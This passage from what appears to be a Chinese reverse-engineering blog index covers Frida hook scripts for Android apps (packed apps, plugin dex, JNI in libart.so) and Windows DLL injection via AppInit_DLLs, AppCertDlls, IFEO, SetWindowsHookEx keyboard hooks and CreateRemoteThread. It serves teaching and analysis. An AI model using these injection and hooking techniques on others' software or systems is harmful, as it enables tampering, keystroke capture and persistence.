","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:5:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"跟踪解释模式下的所有方法 运行在解释模式下的函数,是一定会过解释器的,所以我们要看Android源码中解释器部分的源码. http://androidxref.com/8.1.0_r33/xref/art/runtime/interpreter/interpreter.cc 在Execute函数中进行插桩,只要拿到ArtMethod*指针,就可以输出函数名. static inline JValue Execute( Thread* self, const DexFile::CodeItem* code_item, ShadowFrame\u0026 shadow_frame, JValue result_register, bool stay_in_interpreter = false){ //--------------------------- ArtMethod *method = shadow_frame.GetMethod(); LOG(ERROR)\u003c\u003cmethod-\u003ePrettyMethod().c_str(); if(strstr(method-\u003ePrettyMethod().c_str(),\"mytrace\")) return JValue(); //--------------------------- } 编译上述Android源码,通过以下JavaScript代码即可输出apk中解释模式下的所有方法. function main() { //Execute函数是inline函数,无法直接Hook,但在上面我们插入了strstr这个函数,故我们通过Hook libc.so中的strstr函数来输出函数名 var strstr = Module.findExportByName(\"libc.so\", \"strstr\"); Interceptor.attach(strstr, { onEnter: function (arg) { if (ptr(arg[1]).readCString().indexOf(\"mytrace\") \u003e= 0) { console.log(ptr(arg[0]).readCString()); } } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:5:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook壳 壳一般会替换app的入口Application,我们Hook壳的Application类中的onCreate()函数,等待其执行完成,获取ClassLoader,进而进行Hook. ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:6:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"示例apk 皮皮虾.apk ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:6:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook脚本 function getclassload() { var activityobj = Java.use(\"android.app.ActivityThread\").currentActivityThread(); var mInitialApplication = activityobj.mInitialApplication.value; var mLoadedApk = mInitialApplication.mLoadedApk.value; var mClassLoader = mLoadedApk.mClassLoader.value; return mClassLoader; } function main() { Java.perform(function () { var myshellclass = Java.use(\"com.sup.android.superb.MyWrapperProxyApplication\"); myshellclass.onCreate.implementation = function () { var result = this.onCreate(); var loader = getclassload(); //切ClassLoader // Java.classFactory.loader=loader; var myclass = Java.use(\"com.sup.android.superb.SplashActivity\"); myclass.onCreate.implementation = function (arg) { console.log(\"i am from SplashActivity onCreate\"); return this.onCreate(arg); } console.log(myclass); return result; } }) } setImmediate(main()) ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:6:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook插件Dex ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:7:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个插件Dex package com.example.dexplugin; import android.util.Log; public class MyDex { public static String LuoTst() { Log.d(\"LuoHun\", \"com.example.dexplugin.MyDex.LuoTst\"); return \"Hello MyDex!\"; } } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:7:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个apk加载上述的插件Dex package com.example.loaddex; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.os.strictmode.WebViewMethodCalledOnWrongThreadViolation; import android.util.Log; import android.view.View; import android.widget.Button; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); DexClassLoader dexLoader = new DexClassLoader(\"/data/local/tmp/mydex.dex\", \"/sdcard\", \"sdcard\", MainActivity.class.getClassLoader()); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { try { Class myDexCls = dexLoader.loadClass(\"com.example.dexplugin.MyDex\"); /* Method LuoTst = myDexCls.getDeclaredMethod(\"LuoTst\"); LuoTst.setAccessible(true);*/ Method[] myMethods = myDexCls.getDeclaredMethods(); for (Method n : myMethods) { if (n.getName().indexOf(\"LuoTst\") \u003e= 0) { n.setAccessible(true); String str = (String) n.invoke(null); Log.d(\"loaddex\", str); } } } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException | InvocationTargetException e) { e.printStackTrace(); } } }); } } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:7:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook脚本 function func1() { //通过分析apk,可知ClassLoader用的的DexClassLoader //我们通过Hook DexClassLoader的构造函数,拿ClassLoader var dexclasloader = Java.use(\"dalvik.system.DexClassLoader\"); dexclasloader.$init.implementation = function (a, b, c, d) { var res = this.$init(a, b, c, d); //切ClassLoader Java.classFactory.loader = this; var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } } function func2() { Java.enumerateClassLoaders({ onMatch: function (loader) { try { if (loader.findClass(\"com.example.dexplugin.MyDex\")) { //切ClassLoader Java.classFactory.loader = loader; } } catch (e) { } }, onComplete: function() { console.log(\"enum completed!\") } }) var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } function func3() { Java.choose(\"dalvik.system.DexClassLoader\", { onMatch: function (loader) { try { //切ClassLoader Java.classFactory.loader = loader; var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } catch (e) { } }, onComplete: function () { } }) } function main() { Java.perform(function () { //方案一,spawn方式 //func1() //方案二,不稳 //func2() //方案三,attach方式 func3() }) } setImmediate(main()) ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:7:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"源码 Hook插件Dex相关源码.7z ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:7:4","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"frida\u0026jni 这里主要展示下native层如何调用java层,以及frida Hook libart.so中的导出函数. ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:8:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个apk Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.util.Arrays; public class MainActivity extends AppCompatActivity { private static final String TAG = \"LuoHun\"; // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public static void func1(){ mystaticstr=\"myfunc1\"; Log.e(TAG,\"i am from my func1\"); } public static int func2(int a){ mystaticstr=\"myfunc2\"; Log.e(TAG,\"i am from my func2\"); return a; } public static String func3(String a){ mystaticstr=\"func3\"; Log.e(TAG,a); return a; } public static byte[] func4(byte[] a){ mystaticstr=\"func4\"; Log.e(TAG, Arrays.toString(a)); return a; } static String mystaticstr; } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e#include \"android/log.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; jclass clsMainActivity = env-\u003eFindClass(\"com/example/luodst/MainActivity\"); jmethodID myfun1 = env-\u003eGetStaticMethodID(clsMainActivity, \"func1\", \"()V\"); env-\u003eCallStaticVoidMethod(clsMainActivity, myfun1); jmethodID myfun2 = env-\u003eGetStaticMethodID(clsMainActivity, \"func2\", \"(I)I\"); jint myfun2re = env-\u003eCallStaticIntMethod(clsMainActivity, myfun2, 58); __android_log_print(6, \"LuoHun\", \"%d\", myfun2re); jmethodID myfun3 = env-\u003eGetStaticMethodID(clsMainActivity, \"func3\", \"(Ljava/lang/String;)Ljava/lang/String;\"); jstring mystr = env-\u003eNewStringUTF(\"1231321321\"); jobject myfun3re = env-\u003eCallStaticObjectMethod(clsMainActivity, myfun3, mystr); const char *myreturn = env-\u003eGetStringUTFChars(static_cast\u003cjstring\u003e(myfun3re), 0); __android_log_print(6, \"LuoHun\", \"%s\", myreturn); jmethodID myfun4 = env-\u003eGetStaticMethodID(clsMainActivity, \"func4\", \"([B)[B\"); jbyte mybytearray[5] = {0x11, 0x12, 0x13, 0x14, 0x15}; jbyteArray mybytearrt = env-\u003eNewByteArray(sizeof(mybytearray) / sizeof(jbyte)); env-\u003eSetByteArrayRegion(mybytearrt, 0, sizeof(mybytearray) / sizeof(jbyte), mybytearray); jbyteArray myfun4ret = static_cast\u003cjbyteArray\u003e(env-\u003eCallStaticObjectMethod(clsMainActivity, myfun4, mybytearrt)); jbyte *mylog = env-\u003eGetByteArrayElements(myfun4ret, 0); for (int i = 0; i \u003c env-\u003eGetArrayLength(myfun4ret); i++) __android_log_print(6, \"LuoHun\", \"%x\", *(mylog + i)); jfieldID myfiled = env-\u003eGetStaticFieldID(clsMainActivity, \"mystaticstr\", \"Ljava/lang/String;\"); jstring mystaticstr = static_cast\u003cjstring\u003e(env-\u003eGetStaticObjectField(clsMainActivity, myfiled)); __android_log_print(6, \"LuoHun\", \"%s\", env-\u003eGetStringUTFChars(mystaticstr, 0)); return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:8:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook代码 这里主要展示了如何打印Native层的class,char*以及jbyteArray. function main() { var libart = Module.enumerateSymbols(\"libart.so\"); var findclass = null; var GetStaticMethodID = null; var NewStringUTF = null; var GetStringUTFChars = null; var GetByteArrayElements = null; var GetStaticFieldID = null; var Callstaticmethid = null; var CallStaticObjectMethod = null; for (var i = 0; i \u003c libart.length; i++) { //console.log(libart[i].name) var symbol = libart[i]; if (symbol.name.indexOf(\"art\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"JNI\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"CheckJNI\") \u003c 0) { if (symbol.name.indexOf(\"art3JNI9FindClassEP7_JNIEnvP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) findclass = libart[i].address } if (symbol.name.indexOf(\"N3art3JNI17GetStaticMethodIDEP7_JNIEnvP7_jc\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStaticMethodID = libart[i].address } if (symbol.name.indexOf(\"rt3JNI12NewStringUTFEP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) NewStringUTF = libart[i].address } if (symbol.name.indexOf(\"rt3JNI17GetStringUTFChar\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStringUTFChars = libart[i].address } if (symbol.name.indexOf(\"NI20GetByteArrayElementsEP\") \u003e= 0) { console.log(libart[i].name, libart[i].address) GetByteArrayElements = libart[i].address } if (symbol.name.indexOf(\"NI16GetStaticFieldIDEP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStaticFieldID = libart[i].address } } } // Interceptor.attach(findclass, { // onEnter: function (arg) { // console.log(\"FindClass: \" + ptr(arg[1]).readCString()); // }, // onLeave: function (retval) {} // }) Interceptor.attach(GetStaticMethodID, { onEnter: function (arg) { //打印class var myclass = Java.use(\"java.lang.Class\"); var ret = Java.cast(arg[1], myclass); //console.log(arg[1]) console.log(ret) //打印字符串 console.log(\"GetStaticMethodID: \" + ptr(arg[2]).readCString()) }, onLeave: function (retval) {} }) Interceptor.attach(GetByteArrayElements, { onEnter: function (args) { }, onLeave: function (retval) { console.log(\"GetByteArrayElements:\\n\" + hexdump(retval)) } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:8:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"frida主动调用 这里主要展示frida如何主动调用Native层函数. ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:9:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"准备一个apk Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } /** * A native method that is implemented by the 'luonative' native library, * which is packaged with this application. */ public native String stringFromJNI(); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \u003candroid/log.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"LuoHun\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"LuoHun\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"LuoHun\", __VA_ARGS__); extern \"C\" { int myFunc1(int n) { LOGE(\"myFunc1 %d\\n\", n); return n; } const char *myFunc2(const char *szBuffer) { LOGE(\"myFunc2 %s\\n\", szBuffer); return szBuffer; } jbyte* myFunc3(jbyte* b) { LOGE(\"myFunc3 %p\\n\", b); return b; } } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:9:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Hook"],"content":"Hook代码 function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluonative.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { var func1 = Module.findExportByName(\"libluonative.so\", \"myFunc1\"); func1 = new NativeFunction(func1, 'int', ['int']); console.log(func1(1)); var func2 = Module.findExportByName(\"libluonative.so\", \"myFunc2\"); func2 = new NativeFunction(func2, 'pointer', ['pointer']); var mystr = Memory.alloc(100).writeUtf8String(\"func2 xxxxxxx\"); console.log(func2(mystr).readCString()); var func3 = Module.findExportByName(\"libluonative.so\", \"myFunc3\"); func3 = new NativeFunction(func3, 'pointer', ['pointer']); var b = [0x81, 0x99, 0xff, 0x7d]; mystr = Memory.alloc(100).writeByteArray(b); console.log(hexdump(func3(mystr))); } } }); } setImmediate(hook_dlopen); ","date":"2022-03-27","objectID":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/:9:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/fridahook%E5%A4%A7%E5%85%A8/"},{"categories":["Win相关"],"content":"Windows进程注入技术 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:0:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"注册表 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"AppInit_DLLs HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 当User32.dll被映射到一个新的进程时,会收到DLL_PROCESS_ATTACH通知,当User32.dll对它进行处理的时候,会取得上述注册表键的值,并调用LoadLibary来载入这个字符串中指定的每个DLL. AppInit_Dlls:该键的值可能会包含一个DLL的文件名或一组DLL的文件名(通过空格或逗号分隔)(由于空格是用来分隔文件名的,所以我们必须避免在文件名中包含空格).第一个DLL的文件名可以包含路径,但其他DLL包含的路径则会被忽略,出于这个原因,我们最好是将自己的DLL放到windows的系统目录中,这样就不必指定路径了. User32.dll是一个非常常见的库,用于存储对话框等图形元素.因此,当恶意软件修改此子键时,大多数进程将加载恶意库. 需要注意的是,在win7之后,windows对dll加载的安全性增加了控制. LoadAppInit_DLLs为1开启,为0关闭. RequireSignedAppInit_DLLs值为1表明模块需要签名才能加载. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"AppCertDlls HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls 此注册表项下的DLL被加载到调用Win32 API函数CreateProcess,CreateProcessAsUser,CreateProcessWithLogonW,CreateProcessWithTokenW和WinExec的每个进程中. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"映像文件执行选项(IFEO) HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options IFEO通常用于调试目的.开发人员可以在此注册表项下设置\"调试器值\",以将程序附加到另一个可执行文件以进行调试. 如上图中新建了一个LuoDst.exe项,又添加了Debugger项.这样的话,当我们运行LuoDst.exe实际上运行的是Debugger项中的程序. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 进程注入之注册表.7z ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:4","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"SetWindowsHookEx 钩子实际上是一个处理消息的程序段,通过系统调用,把它挂入系统.每当特定的消息发出,在没有到达目的窗口前,钩子程序就先捕获该消息,亦即钩子函数先得到控制权. 需要注意的是钩子无法更改具体消息携带的数据,只能做监视使用. 钩子分为局部钩子和全局钩子. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"局部钩子 HHOOK g_hHook; LRESULT CALLBACK MyKeyboardProc(int code,// hook code WPARAM wParam, // virtual-key code LPARAM lParam // keystroke-message information ) { //MSDN说明,如果code \u003c 0,必须返回,CallNextHookEx的返回值 if (code \u003c 0) { return CallNextHookEx(g_hHook, code, wParam, lParam); } CString csFmt; csFmt.Format(\"Hook：%c \", wParam); OutputDebugString(csFmt); //把消息传递给下一个钩子 return CallNextHookEx(g_hHook, code, wParam, lParam); } //设置局部钩子 g_hHook = ::SetWindowsHookEx( WH_KEYBOARD, //键盘钩子 MyKeyboardProc, //钩子回调函数 NULL, //局部钩子,填NULL;全局钩子,填DLL的模块句柄 GetCurrentThreadId() //钩本线程的窗口;填NULL则勾所有窗口线程 ); ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"全局钩子 钩子回调函数必须写在Dll中. DLL extern \"C\" __declspec(dllimport) LRESULT MyMessageProcess(int Code, WPARAM wParam, LPARAM lParam); extern \"C\" __declspec(dllexport) LRESULT MyMessageProcess(int Code, WPARAM wParam, LPARAM lParam) { ::MessageBox(NULL, \"Inject Success\", \"LuoDll\", MB_OK); return 0; } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 设置钩子 void CLuoDstDlg::OnBnClickedInject() { //获取被注入进程名 char szInjectProcess[MAX_PATH] = {}; GetDlgItemText(EDT_INJECTNAME, szInjectProcess, MAX_PATH); DWORD dwProcessId = GetPIdByProcessName(szInjectProcess); //获取注入的DLL char szDllName[MAX_PATH] = { 0 }; GetDlgItemText(EDT_INJECTDLL, szDllName, MAX_PATH); BOOL bRet = InjectDllBySetWindowsHook((ULONG32)dwProcessId, szDllName); if (bRet) { MessageBox(\"注入成功\"); } } void CLuoDstDlg::OnBnClickedExit() { if (m_hHook) { UnhookWindowsHookEx(m_hHook); m_hHook = NULL; } if (m_hmDll) { FreeLibrary(m_hmDll); m_hmDll = NULL; } } BOOL CLuoDstDlg::InjectDllBySetWindowsHook(ULONG32 ulTargetProcessID, char* pszDllName) { m_hmDll = LoadLibrary(pszDllName); if (NULL == m_hmDll) { MessageBox(\"LoadLibraryError!\"); return FALSE; } HOOKPROC sub_address = NULL; sub_address = (HOOKPROC)GetProcAddress(m_hmDll, \"MyMessageProcess\"); if (NULL == sub_address) { MessageBox(\"GetProcAddressError!\"); return FALSE; } DWORD dwThreadID = GetThreadID(ulTargetProcessID); /* 参数1:要安装的挂钩类型 参数2:指定系统调用的窗口消息处理函数 参数3:标示一个包含窗口处理消息函数(参数2)的DLL 参数4:安装挂钩的线程ID */ m_hHook = SetWindowsHookEx(WH_KEYBOARD, sub_address, m_hmDll, dwThreadID); if (m_hHook != NULL) { return TRUE; } else { return FALSE; } } DWORD CLuoDstDlg::GetThreadID(ULONG32 ulTargetProcessID) { HANDLE Handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (Handle != INVALID_HANDLE_VALUE) { THREADENTRY32 te; te.dwSize = sizeof(te); if (Thread32First(Handle, \u0026te)) { do { if (te.dwSize \u003e= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) { if (te.th32OwnerProcessID == ulTargetProcessID) { HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te.th32ThreadID); if (!hThread) { //MessageBox(\"Couldn't get thread handle!\"); } else { return te.th32ThreadID; } } } } while (Thread32Next(Handle, \u0026te)); } } CloseHandle(Handle); return (DWORD)0; } DWORD CLuoDstDlg::GetPIdByProcessName(const char* pszProcessName) { DWORD id = 0; //获得系统快照句柄 (得到当前的所有进程) HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pInfo; //用于保存进程信息的一个数据结构 pInfo.dwSize = sizeof(pInfo); //从快照中获取进程列表 Process32First(hSnapShot, \u0026pInfo); //从第一个进程开始循环 do { //这里的 pszProcessName 为你的进程名称 //strcmp(_strlwr(_strdup(pInfo.szExeFile)), pszProcessName) == 0 if (strcmp(pInfo.szExeFile, pszProcessName) == 0) { id = pInfo.th32ProcessID; break; } } while (Process32Next(hSnapShot, \u0026pInfo) != FALSE); return id; } ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 SetWindowsHookEx.7z ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"远程线程注入 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:3:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId ); typedef DWORD (__stdcall *LPTHREAD_START_ROUTINE) ( [in] LPVOID lpThreadParameter); HMODULE LoadLibraryA( [in] LPCSTR lpLibFileName ); 远程线程注入主要是利用了CreateRemoteThread这个API,这API的第四个参数,线程函数的起始地址与LoadLibrary的函数定义相同,又因为LoadLibrary在Kernel32.dll中,kernel32,ntdll,同一台机器,不同进程,加载这两个Dll的位置固定,故可直接填本进程的LoadLibrary地址,从而可以利用CreateRemoteThread这个API在远程进程中加载一个Dll. 